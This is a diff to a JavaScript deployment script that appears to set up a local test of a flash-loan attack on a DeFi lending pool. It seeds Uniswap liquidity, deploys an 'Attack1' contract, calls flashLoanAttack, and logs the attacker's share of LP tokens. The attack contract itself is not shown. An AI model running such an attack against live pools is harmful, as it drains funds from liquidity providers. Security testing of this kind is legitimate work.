@@ -76,8 +76,8 @@ const owner = accounts[0];
   // add initial liquidity of 1M USDC and 1M DAI
   let d = new Date();
   let time = d.getTime();
-  let usdcMil = new BigNumber(1000000 * (10 ** 6));
-  let daiMil = new BigNumber(1000000 * (10 ** 18));
+  let usdcMil = new BigNumber(1111111 * (10 ** 6));
+  let daiMil = new BigNumber(1111111 * (10 ** 18));
 
   await USDC.approve.sendTransaction(uniRouter.address, usdcMil);
   await DAI.approve.sendTransaction(uniRouter.address, daiMil);
@@ -111,19 +111,25 @@ const owner = accounts[0];
   
   // add UND/USDC liquidity
   let UNDtokenBal = await UND.balanceOf(owner);
+  let usdcUnd = new BigNumber(2000000 * (10 ** 6));
   await UND.approve.sendTransaction(uniRouter.address, UNDtokenBal);
-  await USDC.approve.sendTransaction(uniRouter.address, usdcMil); // This number can be adjusted
+  await USDC.approve.sendTransaction(uniRouter.address, usdcUnd); // This number can be adjusted
   await uniRouter.addLiquidity.sendTransaction(
     UND.address,
     USDC.address,
     UNDtokenBal,
-    usdcMil,
+    usdcUnd,
     UNDtokenBal,
-    usdcMil,
+    usdcUnd,
     owner,
     parseInt(time + 1000)
   );
   console.log(UNDtokenBal.toString());
+
+  const undPair = await uniPair.at(undPool.receipt.logs[0].args.pair);
+  let undReserves = await undPair.getReserves();
+  console.log(undReserves._reserve0.toString());
+  console.log(undReserves._reserve1.toString());
 
   // deploy Attack1
   await deployer.deploy(attack1, [UND.address, USDC.address, DAI.address, uniRouter.address, newLLC.address, pairAddr.receipt.logs[0].args.pair]);
@@ -137,8 +143,17 @@ const owner = accounts[0];
   console.log("attacking")
 
   // Initiate flashLoan attack
-  await attackContract.flashLoanAttack.sendTransaction(loanReceiver);
+  const resultsy = await attackContract.flashLoanAttack.sendTransaction(loanReceiver);
 
+  let finalReserves = await LPPool.getReserves();
+  console.log(finalReserves._reserve0.toString());
+  console.log(finalReserves._reserve1.toString());
+  console.log("-----");
+
+  let totalLP = await LPPool.totalSupply();
+  let attackLP = await LPPool.balanceOf(attackContract.address);
+  console.log(totalLP.toString());
+  console.log(attackLP.toString());
   // const attack2Contract = await deployer.deploy(attack2, [undAddress, usdcAddress, daiAddress, routerAddress, LLCAddress, usdcDaiPoolAddress]);
 
   
